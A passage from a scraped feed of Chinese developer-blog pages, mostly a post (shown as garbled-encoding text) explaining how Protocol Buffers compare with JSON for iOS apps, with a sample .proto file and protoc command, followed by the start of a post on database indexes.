New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨iOSå¼€å‘ä¸­ï¼ŒJSONå‡­å€Ÿå…¶å“è¶Šçš„å¯è¯»æ€§å’Œè·¨å¹³å°å…¼å®¹æ€§ï¼Œé•¿æœŸä»¥æ¥éƒ½æ˜¯ç½‘ç»œäº¤äº’å’Œæœ¬åœ°å­˜å‚¨çš„é¦–é€‰ã€‚ä½†ä½ æ˜¯å¦é‡åˆ°è¿‡å› ç½‘ç»œè¯·æ±‚è¿‡æ…¢å¯¼è‡´ç”¨æˆ·ä½“éªŒä¸ä½³ï¼Œæˆ–æ˜¯åœ¨å¤„ç†å¤§é‡æ•°æ®æ—¶åº”ç”¨å“åº”è¿Ÿç¼“çš„æƒ…å†µï¼Ÿé—®é¢˜çš„æ ¹æºæœ‰æ—¶å°±å‡ºåœ¨æ•°æ®äº¤æ¢çš„æ ¼å¼ä¸Šã€‚</p>
<p>ä»Šå¤©ï¼Œæˆ‘ä»¬å°†æ·±å…¥æ¢è®¨ <strong>Protocol Buffersï¼ˆç®€ç§°Protobufï¼‰</strong> â€”â€”ä¸€ç§ç”±Googleè®¾è®¡çš„ç»“æ„åŒ–æ•°æ®åºåˆ—åŒ–æœºåˆ¶ã€‚è¿™ç¯‡åšå®¢å°†æ¾„æ¸…ä¸€ä¸ªå¸¸è§çš„è¯¯è§£ï¼šå¼•å…¥Protobuf<strong>å¹¶éä¸ºäº†å…¨ç›˜å–ä»£JSON</strong>ï¼Œè€Œæ˜¯ä¸ºäº†åœ¨ä½ å·¥å…·ç®±ä¸­å¢åŠ ä¸€ä¸ªå¼ºæœ‰åŠ›çš„é€‰é¡¹ã€‚æˆ‘ä»¬å°†é‡ç‚¹å‰–æå®ƒç›¸æ¯”JSONçš„æ ¸å¿ƒä¼˜åŠ¿ã€ç‹¬ç‰¹çš„å·¥ä½œåŸç†ã€æœ€é€‚ç”¨çš„åœºæ™¯ï¼Œå¹¶çœ‹çœ‹å®ƒæ˜¯å¦‚ä½•åœ¨ç°å®ä¸­è¢«å¤§å‚ä»¬å¹¿æ³›åº”ç”¨çš„ã€‚</p>
<h3 data-id="heading-0">ä¸€ã€ä¸æ˜¯æ›¿ä»£ï¼Œè€Œæ˜¯è¡¥å……ï¼šProtobufä¸JSONçš„æ ¸å¿ƒå·®å¼‚</h3>
<p>è¦åšå‡ºæ˜æ™ºçš„æŠ€æœ¯é€‰å‹ï¼Œé¦–å…ˆè¦ç†è§£å®ƒä»¬çš„æœ¬è´¨åŒºåˆ«ã€‚æˆ‘ä»¬å¯ä»¥ç”¨ä¸€ä¸ªç®€å•çš„æ¯”å–»ï¼šJSONå¥½æ¯”ä¸€å°ä¿¡ä»¶ï¼Œæ‰€æœ‰äººéƒ½èƒ½è½»æ¾é˜…è¯»ï¼›è€ŒProtobufæ›´åƒä¸€å°å¯†ç ç”µæŠ¥ï¼Œä½“ç§¯å°ã€ä¼ è¾“å¿«ï¼Œä½†éœ€è¦å¯†ç æœ¬ï¼ˆå³<code>.proto</code>å®šä¹‰æ–‡ä»¶ï¼‰æ‰èƒ½è§£è¯»ã€‚</p>
<p>ä¸ºäº†æ›´ç›´è§‚ï¼Œè¯·çœ‹ä¸‹è¡¨å¯¹ä¸¤è€…å…³é”®ç‰¹æ€§çš„å¯¹æ¯”ï¼š</p>



































<table><thead><tr><th align="left">ç‰¹æ€§ç»´åº¦</th><th align="left">JSON (æ–‡æœ¬æ ¼å¼)</th><th align="left">Protobuf (äºŒè¿›åˆ¶æ ¼å¼)</th></tr></thead><tbody><tr><td align="left"><strong>å¯è¯»æ€§</strong></td><td align="left"><strong>æé«˜</strong>ï¼Œæ•°æ®æœ¬èº«å°±æ˜¯æ–‡æœ¬ï¼Œæ–¹ä¾¿è°ƒè¯•ã€‚</td><td align="left"><strong>æä½</strong>ï¼ŒäºŒè¿›åˆ¶æ ¼å¼éš¾ä»¥è‚‰çœ¼è¯†åˆ«ã€‚</td></tr><tr><td align="left"><strong>æ•°æ®ä½“ç§¯</strong></td><td align="left"><strong>è¾ƒå¤§</strong>ã€‚åŒ…å«é‡å¤çš„å­—æ®µåã€å¼•å·ã€æ‹¬å·ç­‰å†—ä½™ä¿¡æ¯ã€‚</td><td align="left"><strong>æå°</strong>ã€‚ç”¨å­—æ®µç¼–å·æ›¿ä»£å­—æ®µåï¼Œç¼–ç ç´§å‡‘ã€‚</td></tr><tr><td align="left"><strong>åºåˆ—åŒ–/ååºåˆ—åŒ–é€Ÿåº¦</strong></td><td align="left">è¾ƒæ…¢ã€‚éœ€è§£ææ–‡æœ¬å­—ç¬¦ä¸²ï¼Œè¿›è¡Œç±»å‹è½¬æ¢ã€‚</td><td align="left"><strong>æå¿«</strong>ã€‚ç›´æ¥å¤„ç†äºŒè¿›åˆ¶æµï¼Œç¼–ç /è§£ç å‡ ä¹ç­‰åŒäºå†…å­˜æ‹·è´ã€‚</td></tr><tr><td align="left"><strong>å¼ºç±»å‹ä¸Schema</strong></td><td align="left">æ— ã€‚ä¾èµ–çº¦å®šï¼Œå®¹æ˜“å‡ºé”™ï¼Œéœ€é¢å¤–æ ¡éªŒå·¥å…·ï¼ˆå¦‚JSON Schemaï¼‰ã€‚</td><td align="left"><strong>æœ‰</strong>ã€‚é€šè¿‡<code>.proto</code>æ–‡ä»¶æ˜ç¡®å®šä¹‰ï¼Œç”Ÿæˆç±»å‹å®‰å…¨çš„ä»£ç ã€‚</td></tr><tr><td align="left"><strong>è·¨ç‰ˆæœ¬å…¼å®¹æ€§</strong></td><td align="left">å¼±ã€‚å¢åˆ å­—æ®µæ˜“å¯¼è‡´å®¢æˆ·ç«¯å´©æºƒï¼Œéœ€è¦ä¸¥æ ¼åè°ƒã€‚</td><td align="left"><strong>å¼º</strong>ã€‚è®¾è®¡ä¸Šå°±æ”¯æŒå‘å‰/å‘åå…¼å®¹ï¼Œæ–°å¢å¯é€‰å­—æ®µæ—§ä»£ç è‡ªåŠ¨å¿½ç•¥ã€‚</td></tr></tbody></table>
<p>ä¸€ä¸ªå…¸å‹ä¾‹å­æ˜¯ï¼ŒåŒæ ·ä¸€æ¡åŒ…å«<code>id</code>, <code>name</code>, <code>email</code>ä¸‰ä¸ªå­—æ®µçš„ç”¨æˆ·ä¿¡æ¯ï¼ŒJSONæ ¼å¼çš„æ–‡æœ¬å¯èƒ½é•¿è¾¾ä¸Šç™¾å­—èŠ‚ï¼Œè€ŒProtobufç¼–ç åå¯èƒ½åªæœ‰åå‡ ä¸ªå­—èŠ‚ï¼Œåœ¨å¼±ç½‘ç¯å¢ƒä¸‹ï¼Œè¿™ç§å·®å¼‚ä¼šç›´æ¥å½±å“Appçš„å“åº”é€Ÿåº¦ã€‚</p>
<p>å› æ­¤ï¼Œ<strong>é€‰å‹çš„å…³é”®åœ¨äºåœºæ™¯</strong>ï¼š</p>
<ul>
<li><strong>å¯¹å¤–APIã€é…ç½®æ–‡ä»¶ã€éœ€è¦æµè§ˆå™¨ç›´æ¥è§£æçš„æ•°æ®</strong>ï¼š<strong>JSONæ˜¯ä¸äºŒä¹‹é€‰</strong>ã€‚</li>
<li><strong>å¯¹å†…çš„å¾®æœåŠ¡é€šä¿¡ã€é«˜é¢‘ç‡RPCè°ƒç”¨ã€ç§»åŠ¨ç«¯å¼±ç½‘ä¼˜åŒ–</strong>ï¼š<strong>Protobufçš„ä¼˜åŠ¿å°†éå¸¸çªå‡º</strong>ã€‚</li>
</ul>
<h3 data-id="heading-1">äºŒã€æ€§èƒ½ä¹‹è°œï¼šProtobufä¸ºä½•å¦‚æ­¤é«˜æ•ˆï¼Ÿ</h3>
<p>Protobufçš„é«˜æ€§èƒ½å¹¶éé­”æ³•ï¼Œè€Œæ˜¯æºäºå…¶ç²¾å·§çš„ç¼–ç è®¾è®¡ã€‚ä¸‹é¢è¿™å¼ å›¾æ¸…æ™°åœ°å±•ç¤ºäº†å®ƒçš„å·¥ä½œåŸç†ï¼š</p>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart TD
    A[.proto æ¶ˆæ¯å®šä¹‰æ–‡ä»¶] --&gt; B[protoc ç¼–è¯‘å™¨]
    
    B --&gt; C[ç›®æ ‡è¯­è¨€ä»£ç &lt;br&gt;å¦‚ Swift Class]
    C --&gt; D[åŒ…å«åºåˆ—åŒ–ä¸&lt;br&gt;ååºåˆ—åŒ–æ–¹æ³•]
    
    A --&gt; E[Protobuf ç¼–ç è§„åˆ™]
    
    subgraph E[ç¼–ç è§„åˆ™]
        F[å­—æ®µ: Tag-Length-Value&lt;br&gt;ç¼–ç &lt;br&gt;ç”¨æ•°å­—ç¼–å·ä»£æ›¿å­—æ®µå]
        G[æ•´æ•°: Varint å˜é•¿ç¼–ç &lt;br&gt;å°æ•°å­—èŠ‚æ•°æ›´å°‘]
        H[æœ‰ç¬¦å·æ•´æ•°: ZigZag ç¼–ç &lt;br&gt;ä¼˜åŒ–è´Ÿæ•°å­˜å‚¨]
    end
    
    D -- åºåˆ—åŒ– --&gt; I[ç´§å‡‘çš„äºŒè¿›åˆ¶æ•°æ®]
    I -- ç½‘ç»œä¼ è¾“æˆ–å­˜å‚¨ --&gt; J
    J -- ååºåˆ—åŒ– --&gt; D
</code></pre>
<ul>
<li>
<p><strong>æ ¸å¿ƒ1ï¼šT-L-Vç¼–ç ä¸å­—æ®µç¼–å·</strong>
ProtobufæŠ›å¼ƒäº†å­—æ®µåï¼Œè½¬è€Œä¸ºæ¯ä¸ªå­—æ®µåˆ†é…ä¸€ä¸ªå”¯ä¸€çš„<strong>æ•°å­—ç¼–å·ï¼ˆTagï¼‰</strong>ã€‚åºåˆ—åŒ–æ—¶ï¼Œä¸€ä¸ªå­—æ®µè¢«ç¼–ç ä¸º <code>(Tag, Type, Value)</code> çš„ç»„åˆã€‚æ¥æ”¶æ–¹é€šè¿‡åŒæ ·çš„ <code>.proto</code> æ–‡ä»¶ï¼Œå°±èƒ½å°†ç¼–å·æ˜ å°„å›æ­£ç¡®çš„å­—æ®µåã€‚è¿™ä»æ ¹æœ¬ä¸Šæ¶ˆé™¤äº†JSONä¸­é‡å¤çš„å­—æ®µåå¼€é”€ã€‚</p>
</li>
<li>
<p><strong>æ ¸å¿ƒ2ï¼šVarintä¸ZigZagç¼–ç </strong></p>
<ul>
<li><strong>Varintå˜é•¿ç¼–ç </strong>ï¼šå¯¹äºæ•´æ•°ï¼Œå°æ•°å€¼å ç”¨æ›´å°‘çš„å­—èŠ‚ã€‚æ¯ä¸ªå­—èŠ‚çš„æœ€é«˜ä½æ˜¯æ ‡å¿—ä½ï¼Œè¡¨ç¤ºæ˜¯å¦è¿˜æœ‰åç»­å­—èŠ‚ï¼ŒçœŸæ­£æœ‰æ•ˆçš„åªæœ‰ä½7ä½ã€‚è¿™æ„å‘³ç€æ•°å€¼<code>1</code>åªéœ€1ä¸ªå­—èŠ‚ï¼Œè€Œéå›ºå®šçš„4ä¸ªå­—èŠ‚ã€‚</li>
<li><strong>ZigZagç¼–ç </strong>ï¼šä¸“ä¸ºæœ‰ç¬¦å·æ•´æ•°ä¼˜åŒ–ã€‚å®ƒå°†è´Ÿæ•°â€œæ›²æŠ˜â€æ˜ å°„ä¸ºä¸€ç³»åˆ—æ­£æ•°ï¼ˆå¦‚-1æ˜ å°„ä¸º1ï¼Œ1æ˜ å°„ä¸º2ï¼‰ï¼Œä½¿è´Ÿæ•°ä¹Ÿèƒ½åˆ©ç”¨Varintç¼–ç ç´§å‡‘å­˜å‚¨ã€‚</li>
</ul>
</li>
</ul>
<p>æ­£æ˜¯è¿™äº›åº•å±‚è®¾è®¡ï¼Œä½¿å¾—Protobufèƒ½åœ¨æ•°æ®å¤§å°å’Œè§£æé€Ÿåº¦ä¸Šå®ç°æ•°é‡çº§çš„æå‡ã€‚æ ¹æ®Googleçš„æ•°æ®ï¼ŒProtobufç›¸æ¯”XMLï¼Œè§£æé€Ÿåº¦å¯ä»¥æé«˜20åˆ°100å€ï¼Œæ•°æ®ä½“ç§¯å¯å‡å°åˆ°åŸæ¥çš„1/10åˆ°1/3ã€‚</p>
<h3 data-id="heading-2">ä¸‰ã€iOSå¼€å‘ä¸­ï¼Œä½•æ—¶åº”è¯¥è€ƒè™‘Protobufï¼Ÿ</h3>
<p>åŸºäºä»¥ä¸Šç‰¹æ€§ï¼Œåœ¨iOSå¼€å‘ä¸­ï¼Œä»¥ä¸‹å‡ ç§åœºæ™¯ç‰¹åˆ«é€‚åˆå¼•å…¥Protobufï¼š</p>
<ol>
<li><strong>å¾®æœåŠ¡/åç«¯é«˜é¢‘ç‡é€šä¿¡</strong>ï¼šå½“ä½ çš„Appéœ€è¦ä¸åç«¯è¿›è¡Œå¤§é‡ã€å¯†é›†çš„RPCå¼æ•°æ®äº¤æ¢æ—¶ï¼ˆä¾‹å¦‚å³æ—¶é€šè®¯çš„æ¶ˆæ¯æ¨é€ã€å®æ—¶æ¸¸æˆçŠ¶æ€åŒæ­¥ï¼‰ï¼ŒProtobufå‡å°‘çš„æ¯ä¸€ç‚¹å»¶è¿Ÿå’Œæµé‡éƒ½å°†æ±‡èšæˆæ˜¾è‘—çš„ä½“éªŒä¼˜åŠ¿ã€‚</li>
<li><strong>å¼±ç½‘ç¯å¢ƒä¼˜åŒ–</strong>ï¼šå¯¹äºéœ€è¦å…³æ³¨ç§»åŠ¨ç½‘ç»œä¸‹ç”¨æˆ·ä½“éªŒå’Œç”¨æˆ·æµé‡çš„åº”ç”¨ï¼Œæ›´å°çš„æ•°æ®åŒ…æ„å‘³ç€æ›´å¿«çš„åŠ è½½é€Ÿåº¦å’Œæ›´ä½çš„è¯·æ±‚å¤±è´¥ç‡ã€‚</li>
<li><strong>å®¢æˆ·ç«¯æœ¬åœ°æ•°æ®å­˜å‚¨</strong>ï¼šå¯¹äºéœ€è¦ç¼“å­˜å¤§é‡ç»“æ„åŒ–æ•°æ®ï¼ˆå¦‚æ–°é—»èµ„è®¯ã€äº§å“ç›®å½•ï¼‰çš„åœºæ™¯ï¼Œä½¿ç”¨Protobufåºåˆ—åŒ–åå­˜å‚¨ï¼Œå¯ä»¥èŠ‚çœå¯è§‚çš„ç£ç›˜ç©ºé—´ï¼Œå¹¶åŠ å¿«è¯»å–é€Ÿåº¦ã€‚</li>
<li><strong>å¼ºç±»å‹ä¸å›¢é˜Ÿåä½œ</strong>ï¼šåœ¨å¤§å‹é¡¹ç›®ä¸­ï¼Œ<code>.proto</code>æ–‡ä»¶ä½œä¸ºä¸€ä»½æ˜ç¡®çš„ã€è·¨å¹³å°ï¼ˆiOS, Android, åç«¯ï¼‰çš„æ•°æ®åˆåŒï¼Œèƒ½æœ‰æ•ˆå‡å°‘å‰åç«¯è”è°ƒæ—¶çš„ç±»å‹é”™è¯¯å’Œæ²Ÿé€šæˆæœ¬ã€‚</li>
</ol>
<h3 data-id="heading-3">å››ã€ä¸åªæ˜¯ç†è®ºï¼šå¤§å‚ä»¬çš„å®è·µ</h3>
<p>Protobufå¹¶éå®éªŒå®¤æŠ€æœ¯ï¼Œå®ƒå·²ç»åœ¨ä¸šç•Œè¢«å¹¿æ³›é‡‡ç”¨ï¼Œå¹¶æ„æˆäº†ç°ä»£äº‘åŸç”Ÿå’Œå¾®æœåŠ¡æ¶æ„çš„åŸºçŸ³ã€‚</p>
<ul>
<li><strong>Googleçš„â€œäº²å„¿å­â€</strong>ï¼šProtobufè‡ª2001å¹´èµ·åœ¨Googleå†…éƒ¨ç”¨äºå‡ ä¹æ‰€æœ‰RPCé€šä¿¡å’Œæ•°æ®å­˜å‚¨ï¼Œåäº2008å¹´å¼€æºã€‚å®ƒä¹Ÿæ˜¯gRPCæ¡†æ¶é»˜è®¤çš„åºåˆ—åŒ–åè®®ã€‚å¯ä»¥è¯´ï¼ŒGoogleçš„æ•´ä¸ªåˆ†å¸ƒå¼ç³»ç»Ÿéƒ½æ„å»ºåœ¨Protobufä¹‹ä¸Šã€‚</li>
<li><strong>å­—èŠ‚è·³åŠ¨çš„é€‰æ‹©</strong>ï¼šåœ¨å…¶å¼€æºçš„<strong>Kitex</strong>é«˜æ€§èƒ½Goå¾®æœåŠ¡RPCæ¡†æ¶ä¸­ï¼Œé™¤äº†æ”¯æŒThriftï¼Œä¹Ÿæ·±åº¦æ”¯æŒ<strong>Kitex Protobuf</strong>å’Œ<strong>gRPC</strong>åè®®ï¼Œä»¥åº”å¯¹å…¶æµ·é‡ã€é«˜å¹¶å‘çš„å†…éƒ¨æœåŠ¡é€šä¿¡éœ€æ±‚ã€‚</li>
<li><strong>äº‘åŸç”Ÿç”Ÿæ€çš„æ ‡å‡†</strong>ï¼šåœ¨CNCFï¼ˆäº‘åŸç”Ÿè®¡ç®—åŸºé‡‘ä¼šï¼‰ç”Ÿæ€ä¸­ï¼ŒProtobufæ˜¯è®¸å¤šæ ¸å¿ƒé¡¹ç›®çš„é»˜è®¤æˆ–é‡è¦é€‰æ‹©ã€‚ä¾‹å¦‚ï¼Œåœ¨æœåŠ¡ç½‘æ ¼<strong>Istio</strong>ã€åˆ†å¸ƒå¼è¿½è¸ªç­‰ç³»ç»Ÿä¸­ï¼Œéƒ½å¹¿æ³›ä½¿ç”¨Protobufè¿›è¡Œé«˜æ•ˆçš„æ•°æ®äº¤æ¢ã€‚</li>
<li>å¼€æºæ¡†æ¶MMKVï¼ŒåŸºäºProtobufè¿›è¡Œåºåˆ—åŒ–å­˜å‚¨æå‡äº†æ€§èƒ½ã€‚</li>
</ul>
<h3 data-id="heading-4">äº”ã€åœ¨iOSé¡¹ç›®ä¸­å¦‚ä½•å¼€å§‹ï¼Ÿ</h3>
<p>åœ¨iOSé¡¹ç›®ä¸­ä½¿ç”¨Protobufçš„æµç¨‹éå¸¸æ ‡å‡†åŒ–ï¼š</p>
<ol>
<li><strong>å®šä¹‰å¥‘çº¦</strong>ï¼šç¼–å†™ <code>.proto</code> æ–‡ä»¶ï¼Œå®šä¹‰ä½ çš„è¯·æ±‚å’Œå“åº”æ•°æ®ç»“æ„ã€‚
<pre><code class="hljs language-protobuf" lang="protobuf">syntax = "proto3";
message UserRequest {
  int32 user_id = 1;
}
message UserProfile {
  string name = 1;
  string email = 2;
  int32 age = 3;
}
</code></pre>
</li>
<li><strong>ç”Ÿæˆä»£ç </strong>ï¼šä½¿ç”¨ <code>protoc</code> ç¼–è¯‘å™¨é…åˆ Swift æ’ä»¶ï¼Œå°† <code>.proto</code> æ–‡ä»¶ç¼–è¯‘ä¸º Swift ç±»ã€‚
<pre><code class="hljs language-bash" lang="bash">protoc --swift_out=. your_proto_file.proto
</code></pre>
</li>
<li><strong>é›†æˆä¸ä½¿ç”¨</strong>ï¼šå°†ç”Ÿæˆçš„Swiftæ–‡ä»¶åŠ å…¥é¡¹ç›®ã€‚ç„¶åï¼Œä½ å°±å¯ä»¥åƒä½¿ç”¨æ™®é€šå¯¹è±¡ä¸€æ ·è¿›è¡Œåºåˆ—åŒ–ï¼ˆ<code>serializeToData()</code>ï¼‰å’Œååºåˆ—åŒ–ï¼ˆ<code>init(serializedData:)</code>ï¼‰ã€‚</li>
<li><strong>ç½‘ç»œå±‚æ•´åˆ</strong>ï¼šé€šå¸¸éœ€è¦å°†ç½‘ç»œå±‚ä»åŸºäºJSONçš„<code>URLSession</code>é€‚é…ä¸ºæ”¯æŒProtobufäºŒè¿›åˆ¶æµçš„æ ¼å¼ï¼Œæˆ–ç›´æ¥ä½¿ç”¨åŸºäºProtobufçš„gRPCæ¡†æ¶ã€‚</li>
</ol>
<h3 data-id="heading-5">æ€»ç»“ä¸æœ€ä½³å®è·µ</h3>
<p>å›åˆ°æœ€åˆçš„è§‚ç‚¹ï¼š<strong>Protobufä¸æ˜¯JSONçš„æ›¿ä»£å“ï¼Œè€Œæ˜¯åœ¨ç‰¹å®šé—®é¢˜åŸŸæ›´ä¼˜çš„è§£å†³æ–¹æ¡ˆ</strong>ã€‚</p>
<p>ä¸€ä¸ªç°ä»£ã€å¥å£®çš„æ¶æ„å¾€å¾€æ˜¯æ··åˆå¼çš„ï¼š</p>
<ul>
<li>å¯¹<strong>å¤–</strong>é¢å‘æµè§ˆå™¨ã€ç§»åŠ¨ç«¯æˆ–ç¬¬ä¸‰æ–¹å¼€å‘è€…çš„APIï¼Œç»§ç»­ä½¿ç”¨<strong>JSON</strong>ï¼Œä¿è¯æœ€å¤§çš„å…¼å®¹æ€§å’Œå¯è°ƒè¯•æ€§ã€‚</li>
<li>åœ¨<strong>å†…</strong>éƒ¨æœåŠ¡é—´ã€å¯¹æ€§èƒ½æœ‰æè‡´è¦æ±‚çš„ç§»åŠ¨ç«¯æ•°æ®é€šé“ï¼Œé‡‡ç”¨<strong>Protobuf</strong>ï¼Œè¿½æ±‚æè‡´çš„æ•ˆç‡å’Œç±»å‹å®‰å…¨ã€‚</li>
</ul>
<p>ä½œä¸ºiOSå¼€å‘è€…ï¼Œç†è§£Protobufçš„åŸç†å’Œä¼˜åŠ¿ï¼Œèƒ½è®©ä½ åœ¨é¢ä¸´æ€§èƒ½ç“¶é¢ˆã€æ€è€ƒæ¶æ„ä¼˜åŒ–æ—¶ï¼Œå¤šä¸€ä¸ªå¼ºå¤§è€Œæˆç†Ÿçš„é€‰æ‹©ã€‚æŠ€æœ¯å†³ç­–æ²¡æœ‰é“¶å¼¹ï¼Œåªæœ‰å¯¹åœºæ™¯æœ€åˆé€‚çš„æƒè¡¡ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[è®¡ç®—æœºåä¸‡ä¸ªä¸ºä»€ä¹ˆ--æ•°æ®åº“ç´¢å¼•]]></title>    <link>https://juejin.cn/post/7581292270962114570</link>    <guid>https://juejin.cn/post/7581292270962114570</guid>    <pubDate>2025-12-08T15:57:08.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581292270962114570" data-draft-id="7581292270962081802" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="è®¡ç®—æœºåä¸‡ä¸ªä¸ºä»€ä¹ˆ--æ•°æ®åº“ç´¢å¼•"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2025-12-08T15:57:08.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ— é™å¤§6"/> <meta itemprop="url" content="https://juejin.cn/user/2865758605422890"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            è®¡ç®—æœºåä¸‡ä¸ªä¸ºä»€ä¹ˆ--æ•°æ®åº“ç´¢å¼•
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2865758605422890/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ— é™å¤§6
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T15:57:08.000Z" title="Mon Dec 08 2025 15:57:08 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid 